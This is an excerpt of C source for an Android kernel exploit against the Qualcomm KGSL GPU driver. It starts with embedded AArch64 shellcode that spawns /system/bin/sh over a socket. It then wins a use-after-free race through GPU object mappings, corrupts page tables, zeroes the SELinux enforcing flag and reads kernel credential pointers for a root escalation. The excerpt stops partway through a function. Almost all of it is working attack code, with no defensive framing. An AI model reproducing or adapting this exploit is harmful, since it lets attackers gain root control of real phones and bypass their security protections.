char shellcode[287] = {0xff, 0x03, 0x03, 0xd1, 0xfd, 0x7b, 0x06, 0xa9, 0xfc, 0x6f, 0x07, 0xa9, 0xfa, 0x67, 0x08, 0xa9, 0xf8, 0x5f, 0x09, 0xa9, 0xf6, 0x57, 0x0a, 0xa9, 0xf4, 0x4f, 0x0b, 0xa9, 0xc8, 0x15, 0x80, 0xd2, 0x01, 0x00, 0x00, 0xd4, 0x1f, 0x00, 0x00, 0xf1, 0x01, 0x06, 0x00, 0x54, 0x00, 0x24, 0xa0, 0xf2, 0x01, 0x00, 0x80, 0xd2, 0x02, 0x00, 0x80, 0xd2, 0x03, 0x00, 0x80, 0xd2, 0x88, 0x1b, 0x80, 0xd2, 0x01, 0x00, 0x00, 0xd4, 0x1f, 0x00, 0x00, 0xf1, 0x01, 0x05, 0x00, 0x54, 0x40, 0x00, 0x80, 0xd2, 0x21, 0x00, 0x80, 0xd2, 0x02, 0x00, 0x80, 0xd2, 0xc8, 0x18, 0x80, 0xd2, 0x01, 0x00, 0x00, 0xd4, 0xf3, 0x03, 0x00, 0xaa, 0xe0, 0x03, 0x13, 0xaa, 0x01, 0x05, 0x00, 0x10, 0x02, 0x02, 0x80, 0xd2, 0x68, 0x19, 0x80, 0xd2, 0x01, 0x00, 0x00, 0xd4, 0xe0, 0x03, 0x13, 0xaa, 0x01, 0x00, 0x80, 0xd2, 0xe2, 0x03, 0x1f, 0xaa, 0x08, 0x03, 0x80, 0xd2, 0x01, 0x00, 0x00, 0xd4, 0xe0, 0x03, 0x13, 0xaa, 0x21, 0x00, 0x80, 0xd2, 0xe2, 0x03, 0x1f, 0xaa, 0x08, 0x03, 0x80, 0xd2, 0x01, 0x00, 0x00, 0xd4, 0xe0, 0x03, 0x13, 0xaa, 0x41, 0x00, 0x80, 0xd2, 0xe2, 0x03, 0x1f, 0xaa, 0x08, 0x03, 0x80, 0xd2, 0x01, 0x00, 0x00, 0xd4, 0xe0, 0x02, 0x00, 0x10, 0xf5, 0x03, 0x00, 0xaa, 0x16, 0x00, 0x80, 0xd2, 0xf5, 0x03, 0x00, 0xf9, 0xf6, 0x07, 0x00, 0xf9, 0xe1, 0x03, 0x00, 0x91, 0x02, 0x00, 0x80, 0xd2, 0xa8, 0x1b, 0x80, 0xd2, 0x01, 0x00, 0x00, 0xd4, 0x00, 0x00, 0x80, 0xd2, 0x01, 0x00, 0x80, 0xd2, 0xc8, 0x0b, 0x80, 0xd2, 0x01, 0x00, 0x00, 0xd4, 0xf4, 0x4f, 0x4b, 0xa9, 0xf6, 0x57, 0x4a, 0xa9, 0xf8, 0x5f, 0x49, 0xa9, 0xfa, 0x67, 0x48, 0xa9, 0xfc, 0x6f, 0x47, 0xa9, 0xfd, 0x7b, 0x46, 0xa9, 0xff, 0x03, 0x03, 0x91, 0xc0, 0x03, 0x5f, 0xd6, 0x02, 0x00, 0x05, 0x39, 0x7f, 0x00, 0x00, 0x01, 0x2f, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00}; 
int main(int argc, char **argv)
{   gbuf = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
            MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (gbuf == MAP_FAILED) {
        perror("mmap");
        exit(1);
    }
    fprintf(stderr, "main  pid = %d, main ppid=%d\n", getpid(),getppid());
    g_leaksock[0]=g_leaksock[1]=-1;
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, g_leaksock) != 0) {
        perror("socketpair");
        exit(1);
    }
    fprintf(stderr, "leak sock pair = %d,%d\n", g_leaksock[0], g_leaksock[1]);
    install_handlers();
    gbuf[0x888]=0;
    int pid = fork();
    if (!pid) {
        fprintf(stderr,"child1\n");
        int pid2 = fork();
        if (!pid2){
            while(1){
                if(gbuf[FOUND_PID]==0x12){
                    sleep(2);
                    gbuf[CALL_LOGLINE]=0x11;
                    fprintf(stderr, "child 2 pid = %d, child2 ppid=%d\n", getpid(),getppid());
                    //__builtin_trap();
                    return 0;
                }
                usleep(100000);
                
            }
        }
        else{
            //__builtin_trap();
            while(1){
                if(gbuf[FOUND_PID]==0x11){
                    fprintf(stderr, "child 1 pid = %d, child1 ppid=%d\n", getpid(),getppid());
                    gbuf[FOUND_PID]=0x12;
                    _exit(1);
                }
                sleep(1);
            } 
        }
        
    }
    

    char shellcode_path[600];
    snprintf(shellcode_path, sizeof(shellcode_path), "%s/shellcode", g_workdir);
    fd_shellcode=open(shellcode_path, O_RDWR | O_CREAT | O_TRUNC,0777);
    write(fd_shellcode,shellcode,287);
    
    char * path = "/system/lib64/libbase.so";
    fd_lib=open(path,O_RDONLY);
    if (fd_lib<0) perror("open");
    
    if (fstat(fd_lib, &st) < 0) { close(fd_lib); return 0; }



    spray_ctrl = mmap(NULL,
                  sizeof(spray_slot_t) * SPRAY_COUNT_MAX,
                  PROT_READ | PROT_WRITE,
                  MAP_SHARED | MAP_ANONYMOUS,
                  -1, 0);
    if (spray_ctrl == MAP_FAILED) {
        perror("mmap spray_ctrl");
        exit(1);
    }
    memset(spray_ctrl, 0, sizeof(spray_slot_t) * SPRAY_COUNT_MAX);
    


restart: ;
    unsigned int uaf_id = 0, overlap_id = 0, ph_id = 0;
    uint64_t uaf_mmapsize = 0, overlap_mmapsize = 0, ph_mmapsize = 0;
    void *uaf_vma = NULL, *bogus_vma = NULL, *ph_vma = NULL, *overlap_vma = NULL;
    int success = 0;
    int retries = 20;
    uaf_id = overlap_id = ph_id = 0;
    uaf_mmapsize = overlap_mmapsize = ph_mmapsize = 0;
    uaf_vma = bogus_vma = ph_vma = overlap_vma = NULL;
    success = 0;
    
    fd = open(DEV_PATH, O_RDWR | O_CLOEXEC);
    if (fd < 0) {
        perror("open /dev/kgsl-3d0");
        return 1;
    }
    fprintf(stderr, "[R] reopened /dev/kgsl-3d0 fd=%d\n", fd);
    fflush(stderr);
    
    fprintf(stderr, "[1] UAF GPUOBJ_ALLOC\n");
    struct kgsl_gpuobj_alloc uaf_alloc = {0};
    uaf_alloc.size = UAF_SIZE;
    uaf_alloc.flags = KGSL_MEMFLAGS_USE_CPU_MAP;
    uaf_alloc.va_len = 0;
    
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &uaf_alloc) < 0) {
        fprintf(stderr, "[!] UAF alloc failed: %s\n", strerror(errno));
        return 1;
    }
    uaf_id = uaf_alloc.id;
    uaf_mmapsize = uaf_alloc.mmapsize;
    fprintf(stderr, "    UAF id=%u mmapsize=0x%llx\n", uaf_id,
            (unsigned long long)uaf_mmapsize);
    
    fprintf(stderr, "\n[2] OVERLAP GPUOBJ_ALLOC (no mmap yet)\n");
    struct kgsl_gpuobj_alloc overlap_alloc = {0};
    overlap_alloc.size = OVERLAP_SIZE;
    overlap_alloc.flags = KGSL_MEMFLAGS_USE_CPU_MAP;
    overlap_alloc.va_len = 0;
    
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &overlap_alloc) < 0) {
        fprintf(stderr, "[!] OVERLAP alloc failed: %s\n", strerror(errno));
        return 1;
    }
    overlap_id = overlap_alloc.id;
    overlap_mmapsize = overlap_alloc.mmapsize;
    fprintf(stderr, "    OVERLAP id=%u mmapsize=0x%llx\n", overlap_id,
            (unsigned long long)overlap_mmapsize);
    
    fprintf(stderr, "\n[3] UAF mmap() at FIXED 0x%llx\n",
            (unsigned long long)UAF_START);
    uaf_vma = mmap_gpuobj_fixed(fd, uaf_id, uaf_mmapsize, (void *)(uintptr_t)UAF_START);
    if (uaf_vma == MAP_FAILED || (uint64_t)uaf_vma != UAF_START) {
        fprintf(stderr, "[!] UAF mmap failed: %s\n", strerror(errno));
        return 1;
    }
    fprintf(stderr, "    UAF mapped at %p (expected 0x%llx)\n", 
            uaf_vma, (unsigned long long)UAF_START);
    
    // Touch pages
    for (size_t i = 0; i < uaf_mmapsize; i += PAGE_SIZE) {
        ((volatile char *)uaf_vma)[i] = 1;
    }
    fprintf(stderr, "    Touched %llu pages\n", 
            (unsigned long long)(uaf_mmapsize / PAGE_SIZE));
    
#if PAUSEPAGEMAP
    mk("uaf pagemap window open");
    fprintf(stderr, "    [PAUSE] pagemap window pid=%d UAF_START=0x%llx size=0x%llx (40s)\n",
            (int)getpid(), (unsigned long long)UAF_START, (unsigned long long)uaf_mmapsize);
    fflush(stderr);
    {
        /* if run as root: dump own /proc/self/pagemap for the UAF region to a file */
        int pmfd = open("/proc/self/pagemap", O_RDONLY);
        if (pmfd >= 0) {
            off_t base = (off_t)(UAF_START >> 12) * 8;
            size_t nent = (size_t)(uaf_mmapsize >> 12);
            static uint64_t pmbuf[131072];
            memset(pmbuf, 0, sizeof(pmbuf));
            if (nent > 131072) nent = 131072;
            ssize_t pr = pread(pmfd, pmbuf, nent * 8, base);
            close(pmfd);
            if (pr > 0) {
                char upb[600];
                snprintf(upb, sizeof(upb), "%s/uafpagemap.bin", g_workdir);
                int ofd = open(upb, O_CREAT | O_TRUNC | O_WRONLY, 0644);
                if (ofd >= 0) { write(ofd, pmbuf, pr); close(ofd); }
                int present = 0;
                for (size_t k = 0; k < pr / 8; k++) if ((pmbuf[k] >> 63) & 1) present++;
                char mp[64];
                snprintf(mp, sizeof(mp), "uaf pagemap saved n=%lld present=%d",
                         (long long)(pr / 8), present);
                mk(mp);
            }
        }
    }
    for (int wi = 0; wi < 100; wi++) poll(NULL, 0, 100);
    mk("uaf pagemap window closed");
#endif

    fprintf(stderr, "\n[4] UAF munmap()\n");
    fprintf(stderr, "    Note: rbtree entry and IOMMU PTEs remain\n");
    munmap(uaf_vma, uaf_mmapsize);
    uaf_vma = NULL;
    usleep(200);
    
    fprintf(stderr, "\n[5] Anonymous mmap at 0x%llx (3 pages)\n",
            (unsigned long long)BOGUS_START);
    bogus_vma = mmap((void *)(uintptr_t)BOGUS_START, PAGE_SIZE * 3,
                     PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
                     -1, 0);
    if (bogus_vma == MAP_FAILED || (uint64_t)bogus_vma != BOGUS_START) {
        fprintf(stderr, "[!] BOGUS mmap failed: %s\n", strerror(errno));
        return 1;
    }
    for (int i = 0; i < 3; i++) {
        ((volatile char *)bogus_vma)[i * PAGE_SIZE] = 1;
    }
    fprintf(stderr, "    BOGUS VMA at %p\n", bogus_vma);
    
    fprintf(stderr, "\n[6] PLACEHOLDER GPUOBJ_ALLOC\n");
    struct kgsl_gpuobj_alloc ph_alloc = {0};
    ph_alloc.size = PLACEH_SIZE;
    ph_alloc.flags = KGSL_MEMFLAGS_USE_CPU_MAP;
    ph_alloc.va_len = 0;
    
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &ph_alloc) < 0) {
        fprintf(stderr, "[!] PLACEHOLDER alloc failed: %s\n", strerror(errno));
        return 1;
    }
    ph_id = ph_alloc.id;
    ph_mmapsize = ph_alloc.mmapsize;
    fprintf(stderr, "    PLACEHOLDER id=%u mmapsize=0x%llx\n", ph_id,
            (unsigned long long)ph_mmapsize);
    
    fprintf(stderr, "\n[7] PLACEHOLDER mmap() at FIXED 0x%llx\n",
            (unsigned long long)PLACEH_START);
    ph_vma = mmap_gpuobj_fixed(fd, ph_id, ph_mmapsize, (void *)(uintptr_t)PLACEH_START);
    if (ph_vma == MAP_FAILED || (uint64_t)ph_vma != PLACEH_START) {
        fprintf(stderr, "[!] PLACEHOLDER mmap failed: %s\n", strerror(errno));
        return 1;
    }
    fprintf(stderr, "    PLACEHOLDER mapped at %p (expected 0x%llx)\n", 
            ph_vma, (unsigned long long)PLACEH_START);
    
    // Touch pages
    for (size_t i = 0; i < ph_mmapsize; i += (PAGE_SIZE * 1024)) {
        ((volatile char *)ph_vma)[i] = 1;
    }
    

    
    int mmap_errno = 0;
    
    
#if DISCOVERY_SKIP_RACE
    /* discovery build: skip the OVERLAP mmap race; go straight to the UAF free +
     * fork-spray + scan so we can correlate the task page phys (via pagemap). */
    fprintf(stderr, "[8/9] DISCOVERY_SKIP_RACE: skipping OVERLAP race\n");
    success = 1;
#else
    fprintf(stderr, "[8] Main thread will mmap OVERLAP\n\n");
    
    race_state_t rs = {
        .fd = fd,
        .ready = 0,
        .bogus_started = 0,
        .result = -1,
        .saved_errno = 0
    };
    
    pthread_t bogus_thread;
    pthread_create(&bogus_thread, NULL, bogus_racer, &rs);
    
    rs.ready = 1;
    __sync_synchronize();
    
    // wait for thread
    int timeout = 0;
    while (!rs.bogus_started && timeout < 1000) {
        __asm__ __volatile__("" ::: "memory");
        timeout++;
    }
    
    // Race window delay 
    usleep(200);
    
    fprintf(stderr, "[9] OVERLAP mmap() at FIXED 0x%llx during race\n",
            (unsigned long long)OVERLAP_START);
    
    // Try race
    overlap_vma = mmap_gpuobj_fixed(fd, overlap_id, overlap_mmapsize, (void *)(uintptr_t)OVERLAP_START);
    mmap_errno = errno;
    
    pthread_join(bogus_thread, NULL);
    
    fprintf(stderr, "    OVERLAP mmap result: %s\n",
            overlap_vma == MAP_FAILED ? "FAILED" : "SUCCESS");
    
    if (overlap_vma == MAP_FAILED) {
        fprintf(stderr, "      errno=%d (%s)\n", mmap_errno, strerror(mmap_errno));
    } else {
        fprintf(stderr, "      mapped at %p (expected 0x%llx)\n",
                overlap_vma, (unsigned long long)OVERLAP_START);
    }
    
    if (overlap_vma == MAP_FAILED && mmap_errno == 19) {  // ENODEV
        fprintf(stderr, "\n[!] RACE CONDITION WON!\n");
        success = 1;
    }
#endif


    if (!success) {
        fprintf(stderr, "[-] Race failed (errno=%d), retrying...\n", mmap_errno);

        if (overlap_vma != MAP_FAILED && overlap_vma != NULL) {
            munmap(overlap_vma, overlap_mmapsize);
        }
        
        if (ph_vma != MAP_FAILED && ph_vma != NULL) {
            munmap(ph_vma, ph_mmapsize);
        }
        
        if (bogus_vma != MAP_FAILED && bogus_vma != NULL) {
            munmap(bogus_vma, PAGE_SIZE * 3);
        }


        struct kgsl_gpuobj_free free_obj;
        free_obj.flags = 0; 

        if (overlap_id) {
            free_obj.id = overlap_id;
            ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &free_obj);
        }
        if (ph_id) {
            free_obj.id = ph_id;
            ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &free_obj);
        }
        if (uaf_id) {
            free_obj.id = uaf_id;
            ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &free_obj);
        }


        if (fd >= 0) {
            close(fd);
            fd = -1;
        }

        retries--;
        if (retries > 0) {
            fprintf(stderr, "[-] Retrying exploit... (%d attempts left)\n", retries);
            fprintf(stderr, "    [R] cleanup done, pid=%d, sleeping 1s\n", (int)getpid());
            fflush(stderr);
            sleep(1);
            goto restart; 
        } else {
            fprintf(stderr, "[!] All retries failed. Giving up.\n");
            return 1;
        }
    }

    
    fprintf(stderr, "[10] Freeing UAF to create dangling PTEs\n");
    struct kgsl_gpuobj_free uaf_free = {0};
    uaf_free.id = uaf_id;
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &uaf_free) == 0) {
        fprintf(stderr, "    UAF freed (id=%u)\n", uaf_id);
        uaf_id = 0;
    }

#if PHASE1_PFN && !defined(CRED_OVERWRITE)
    /* ---- PHASE 1+2+3: PFN/page-table corruption, verified end-to-end ---- */
    fprintf(stderr, "\n[PHASE1] mmap_spray\n");
    mk("phase1 mmap_spray start");
    mmap_spray();

    struct nonzero_page p1pages[MAX_FOUND_PAGES];
    int p1num = 0;
    /* optional candidate kernel phys from <workdir>/cand (hex, no 0x) */
    {
        char cand_path[600], attr_path[600];
        snprintf(cand_path, sizeof(cand_path), "%s/cand", g_workdir);
        snprintf(attr_path, sizeof(attr_path), "%s/attr", g_workdir);
        int cfd = open(cand_path, O_RDONLY);
        if (cfd >= 0) {
            char cb[32] = {0};
            ssize_t cn = read(cfd, cb, sizeof(cb) - 1);
            close(cfd);
            if (cn > 0) {
                g_kern_cand_phys = strtoull(cb, NULL, 16);
                char mc[64];
                snprintf(mc, sizeof(mc), "phase1 cand_phys=0x%llx", (unsigned long long)g_kern_cand_phys);
                mk(mc);
                fprintf(stderr, "%s\n", mc);
            }
        }
        int afd = open(attr_path, O_RDONLY);
        if (afd >= 0) {
            char ab[8] = {0};
            ssize_t an = read(afd, ab, sizeof(ab) - 1);
            close(afd);
            if (an > 0) {
                g_pte_attrindex = (unsigned)strtoul(ab, NULL, 16) & 0x7;
                char ma[64];
                snprintf(ma, sizeof(ma), "phase1 pte_attrindex=0x%x", g_pte_attrindex);
                mk(ma);
                fprintf(stderr, "%s\n", ma);
            }
        }
    }
    mk("phase1 scan start");
    g_f53_count = 0;
    scan_uaf_and_collect(fd, p1pages, &p1num);
    mk("phase1 scan done");
    {
        uint32_t rb2 = *(uint32_t *)(gbuf + 0xb00);
        char mrb[64];
        snprintf(mrb, sizeof(mrb), "phase1 rb_count=%u f53=%u", rb2, g_f53_count);
        mk(mrb);
        fprintf(stderr, "%s\n", mrb);
    }

    {
        char mkp[64];
        snprintf(mkp, sizeof(mkp), "phase1 kernpte_va=0x%llx", (unsigned long long)g_kern_pte_page);
        mk(mkp);
        fprintf(stderr, "%s\n", mkp);
    }

    /* GPU-dump the dense F53 page (potential kernel page table) and report its PTEs' PFNs */
    if (g_kern_pte_page) {
        struct kgsl_drawctxt_create ctxk = { .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC };
        if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctxk) == 0) {
            unsigned ctxk_id = ctxk.drawctxt_id;
            struct kgsl_gpuobj_alloc ibk = { .size = PAGE_SIZE * 8, .flags = KGSL_MEMFLAGS_USE_CPU_MAP };
            if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &ibk) == 0) {
                unsigned ibk_id = ibk.id;
                void *ibk_vma = mmap(NULL, ibk.mmapsize, PROT_READ | PROT_WRITE, MAP_SHARED, fd, ((off_t)ibk_id) << 12);
                if (ibk_vma != MAP_FAILED) {
                    struct kgsl_gpuobj_info ik = { .id = ibk_id };
                    ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &ik);
                    uint64_t ibk_gpu = ik.gpuaddr;
                    struct kgsl_gpuobj_alloc dk = { .size = PAGE_SIZE * 2, .flags = KGSL_MEMFLAGS_USE_CPU_MAP };
                    unsigned dk_id = 0; void *dk_vma = NULL; uint64_t dk_gpu = 0;
                    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &dk) == 0) {
                        dk_id = dk.id;
                        dk_vma = mmap(NULL, dk.mmapsize, PROT_READ | PROT_WRITE, MAP_SHARED, fd, ((off_t)dk_id) << 12);
                        if (dk_vma != MAP_FAILED) {
                            struct kgsl_gpuobj_info di = { .id = dk_id };
                            ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &di);
                            dk_gpu = di.gpuaddr;
                        }
                    }
                    uint32_t *cmd = (uint32_t *)ibk_vma;
                    int dw = 0;
                    memset(ibk_vma, 0, ibk.mmapsize);
                    cmd[dw++] = cp_type7_packet(CP_NOP, 0);
                    uint32_t d_lo, d_hi, s_lo, s_hi;
                    for (int i_d = 0; i_d < 0x400; i_d++) {
                        split64(dk_gpu + (uint64_t)i_d * 4, &d_lo, &d_hi);
                        split64(g_kern_pte_page + (uint64_t)i_d * 4, &s_lo, &s_hi);
                        cmd[dw++] = cp_type7_packet(CP_MEM_TO_MEM, 5);
                        cmd[dw++] = 0; cmd[dw++] = d_lo; cmd[dw++] = d_hi;
                        cmd[dw++] = s_lo; cmd[dw++] = s_hi;
                    }
                    cmd[dw++] = cp_type7_packet(CP_NOP, 0);
                    size_t bytes = (size_t)dw * 4;
                    msync(ibk_vma, bytes, MS_SYNC);
                    struct kgsl_command_object obj = { .gpuaddr = ibk_gpu, .size = bytes, .flags = KGSL_CMDLIST_IB, .id = ibk_id };
                    struct kgsl_gpu_command c = {0};
                    c.cmdlist = (uint64_t)(uintptr_t)&obj; c.cmdsize = sizeof(obj); c.numcmds = 1; c.context_id = ctxk_id;
                    if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &c) == 0 && wait_timestamp(fd, ctxk_id, c.timestamp) == 0) {
                        msync(dk_vma, 0x1000, MS_SYNC | MS_INVALIDATE);
                        uint64_t PFN_MASK = PHYS_MASK & PAGE_MASK;
                        uint64_t *e = (uint64_t *)dk_vma;
                        /* report distinct F53-tagged PFNs across the whole page */
                        uint64_t seen[32]; int nseen = 0;
                        for (int k = 0; k < 512; k++) {
                            uint64_t val = e[k];
                            if ((val & 0xFFF) != 0xF53) continue;
                            uint64_t pfn = val & PFN_MASK;
                            if (pfn == 0) continue;
                            int dup = 0;
                            for (int s = 0; s < nseen; s++) if (seen[s] == pfn) { dup = 1; break; }
                            if (!dup && nseen < 32) {
                                seen[nseen++] = pfn;
                                char md[128];
                                snprintf(md, sizeof(md), "phase1 kernpte[%03x] pfn=0x%llx val=0x%016llx",
                                         k * 8, (unsigned long long)pfn, (unsigned long long)val);
                                mk(md);
                                fprintf(stderr, "%s\n", md);
                            }
                        }
                    }
                    if (dk_vma && dk_vma != MAP_FAILED) munmap(dk_vma, dk.mmapsize);
                    if (dk_id) { struct kgsl_gpuobj_free fr = {0}; fr.id = dk_id; ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr); }
                    munmap(ibk_vma, ibk.mmapsize);
                }
                { struct kgsl_gpuobj_free fr = {0}; fr.id = ibk_id; ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr); }
            }
        }
    }

    /* the one-shot mirror re-pointed one sig page's PTE (either a user double-map
     * or the candidate kernel phys). Find that stride: sig page no longer holds
     * the [sig,0,0,..] pattern. */
    if (gb_target_addr == 0) {
        signal(SIGBUS, sigsegv_jmp);
        signal(SIGSEGV, sigsegv_jmp);
        for (int i2 = 0; i2 < MMAP_SPRAY_COUNT; i2++) {
            uint8_t *base2 = (uint8_t *)(MMAP_SPRAY_BASE + (uint64_t)i2 * MMAP_SPRAY_STRIDE);
            int is_sig = 0, corrupted = 0;
            if (sigsetjmp(g_jb, 1) == 0) {
                g_jb_armed = 1;
                volatile uint8_t *p0 = (volatile uint8_t *)(base2 + PAGE_SIZE * (uint64_t)sig_num[0]);
                is_sig = (p0[0] == sig_num[0]);
                if (is_sig) {
                    for (int so = 0x40; so < 0x1000; so += 0x40)
                        if (p0[so] != 0) { is_sig = 0; break; }
                }
                corrupted = !is_sig;
                g_jb_armed = 0;
            } else {
                g_jb_armed = 0;
                corrupted = 1;   /* faulting page = bad alias = the corrupted one */
            }
            if (corrupted) {
#if 1
                {
                    static int ddbg = 0;
                    if (ddbg < 8) {
                        char md[128];
                        snprintf(md, sizeof(md), "phase1 nomatch[%d]@0x%llx: %02x %02x %02x %02x %02x %02x %02x %02x",
                                 i2, (unsigned long long)base2,
                                 *(volatile uint8_t *)(base2 + PAGE_SIZE * (uint64_t)sig_num[0] + 0),
                                 *(volatile uint8_t *)(base2 + PAGE_SIZE * (uint64_t)sig_num[0] + 1),
                                 *(volatile uint8_t *)(base2 + PAGE_SIZE * (uint64_t)sig_num[0] + 2),
                                 *(volatile uint8_t *)(base2 + PAGE_SIZE * (uint64_t)sig_num[0] + 3),
                                 *(volatile uint8_t *)(base2 + PAGE_SIZE * (uint64_t)sig_num[0] + 4),
                                 *(volatile uint8_t *)(base2 + PAGE_SIZE * (uint64_t)sig_num[0] + 5),
                                 *(volatile uint8_t *)(base2 + PAGE_SIZE * (uint64_t)sig_num[0] + 6),
                                 *(volatile uint8_t *)(base2 + PAGE_SIZE * (uint64_t)sig_num[0] + 7));
                        mk(md); fprintf(stderr, "%s\n", md);
                        ddbg++;
                    }
                }
#endif
                gb_target_addr = (uint64_t)base2;
                /* dump the corrupted +0x1000 page */
                if (sigsetjmp(g_jb, 1) == 0) {
                    g_jb_armed = 1;
                    {
                        volatile uint64_t *q = (volatile uint64_t *)(base2 + PAGE_SIZE * (uint64_t)sig_num[0]);
                        char m[200];
                        snprintf(m, sizeof(m),
                                 "phase1scan repatched@0x%llx: %016llx %016llx %016llx %016llx",
                                 (unsigned long long)base2, (unsigned long long)q[0],
                                 (unsigned long long)q[1], (unsigned long long)q[2],
                                 (unsigned long long)q[3]);
                        mk(m);
                        fprintf(stderr, "%s\n", m);
                    }
                    g_jb_armed = 0;
                } else {
                    g_jb_armed = 0;
                }
                break;
            }
        }
        signal(SIGBUS, die_handler);
        signal(SIGSEGV, die_handler);
    }
    {
        char mt[64];
         snprintf(mt, sizeof(mt), "phase1 target=0x%llx", (unsigned long long)gb_target_addr);
         mk(mt);
         fprintf(stderr, "%s\n", mt);
     }
#if PHASE4_ZERO
    /* WRITE-ONLY: the one-shot mirror mapped the candidate phys (selinux_state page)
     * into the found stride's sig pages. Zero the enforcing byte. Do NOT exit afterward:
     * freeing the mm (exit) triggers "BUG: Bad page map" -> panic. Sleep forever. */
    if (g_kern_cand_phys && gb_target_addr) {
        mk("phase4 zero start");
        signal(SIGBUS, sigsegv_jmp);
        signal(SIGSEGV, sigsegv_jmp);
        {
            uint8_t *pg = (uint8_t *)(gb_target_addr + PAGE_SIZE * (uint64_t)sig_num[0]);
            uint64_t enoff = g_kern_cand_phys & 0xFFF;
            if (sigsetjmp(g_jb, 1) == 0) {
                g_jb_armed = 1;
                /* zero the enforcing byte at selinux_state + 0x01 */
                *(volatile uint8_t *)(pg + enoff + 0x01) = 0;
                __builtin___clear_cache((char *)(pg + enoff), (char *)(pg + enoff + 0x40));
                {
                    char mr[128];
                    snprintf(mr, sizeof(mr), "phase4 wrote state+1 -> %02x (readback %02x %02x %02x %02x)",
                             (unsigned)pg[enoff + 0x01], (unsigned)pg[enoff + 0x00],
                             (unsigned)pg[enoff + 0x01], (unsigned)pg[enoff + 0x02],
                             (unsigned)pg[enoff + 0x03]);
                    mk(mr); fprintf(stderr, "%s\n", mr);
                }
                g_jb_armed = 0;
            } else {
                g_jb_armed = 0;
                mk("phase4 write faulted");
            }
        }
        signal(SIGBUS, die_handler);
        signal(SIGSEGV, die_handler);
        {
            int efd = open("/sys/fs/selinux/enforce", O_RDONLY);
            if (efd >= 0) {
                char eb[8] = {0};
                read(efd, eb, sizeof(eb) - 1);
                close(efd);
                {
                    char mr[64];
                    snprintf(mr, sizeof(mr), "phase4 enforce='%s'", eb);
                    mk(mr); fprintf(stderr, "%s\n", mr);
                }
            }
        }
        mk("phase4 zeroed - sleeping forever");
        for (;;) pause();
    }
#endif
#if READ_INITCRED
    /* map the init_task page (cand=0x82a8d500) and read the cred pointer at
     * init_task+0x768 (= init_cred VA). Write it (hex) to /data/local/tmp/initcred,
     * then sleep forever so the boot (KASLR) stays stable for the cred-write run. */
    if (g_kern_cand_phys && gb_target_addr) {
        uint8_t *pg = (uint8_t *)(gb_target_addr + PAGE_SIZE * (uint64_t)sig_num[0]);
        uint64_t enoff = g_kern_cand_phys & 0xFFF;
        uint64_t cred_va = 0;
        mk("readcred start");
        if (sigsetjmp(g_jb, 1) == 0) {
            g_jb_armed = 1;
            cred_va = *(volatile uint64_t *)(pg + enoff + 0x768);
            g_jb_armed = 0;
        } else {
            g_jb_armed = 0;
            mk("readcred faulted");
        }
        {
            char mcr[96];
            snprintf(mcr, sizeof(mcr), "readcred init_cred=0x%llx", (unsigned long long)cred_va);
            mk(mcr); fprintf(stderr, "%s\n", mcr);
        }
        if (cred_va && (cred_va >> 48) == 0xffffULL) {
            char icp[600];
            snprintf(icp, sizeof(icp), "%s/initcred", g_workdir);
            int cfd = open(icp, O_CREAT | O_TRUNC | O_WRONLY, 0644);
            if (cfd >= 0) {
                char cb[32];
                int len = snprintf(cb, sizeof(cb), "%llx", (unsigned long long)cred_va);
                write(cfd, cb, len);
                close(cfd);
            }
            mk("readcred written");
        }
        mk("readcred sleeping");
        for (;;) pause();
    }
#endif
    if (!gb_target_addr) {
        mk("phase1 NO double-mapped stride");
        fprintf(stderr, "[PHASE1] no double-mapped stride\n");
#if defined(PHASE4_ZERO) || defined(PHASE_TASKDUMP) || defined(READ_INITCRED)
        for (;;) pause();
#else
        _exit(0);
#endif
    }
#if PHASE_TASKDUMP
    /* dump the aliased page (cand phys) to /data/local/tmp/taskdump.bin */
    {
        uint8_t *pg = (uint8_t *)(gb_target_addr + PAGE_SIZE * (uint64_t)sig_num[0]);
        uint64_t enoff = g_kern_cand_phys & 0xFFF;
        if (sigsetjmp(g_jb, 1) == 0) {
            g_jb_armed = 1;
            {
                static uint8_t dmp[8192];
                memset(dmp, 0, sizeof(dmp));
                memcpy(dmp, pg + enoff, 0x1000 - (enoff & 0xFFF) < 0x1000 ? 0x1000 - (enoff & 0xFFF) : 0x1000);
                int dfd = open("/dev/null", O_CREAT | O_TRUNC | O_WRONLY, 0644);
                if (dfd >= 0) {
                    write(dfd, dmp, 0x1000);
                    close(dfd);
                    mk("phase taskdump written");
                } else {
                    mk("phase taskdump open failed");
                }
            }
            g_jb_armed = 0;
        } else {
            g_jb_armed = 0;
            mk("phase taskdump faulted");
        }
        mk("phase taskdump sleeping");
        for (;;) pause();
    }
#endif
    uint64_t u1 = gb_target_addr + PAGE_SIZE * (uint64_t)sig_num[0];
    uint64_t va = *(uint64_t *)(gbuf + 0xb08);   /* found PTE page UAF VA */

    /* GPU context + IB + dump */
    struct kgsl_drawctxt_create ctx2p = { .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC };
    if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx2p) != 0) {
        mk("phase1 ctx2 FAILED");
        _exit(0);
    }
    unsigned ctx_id2p = ctx2p.drawctxt_id;
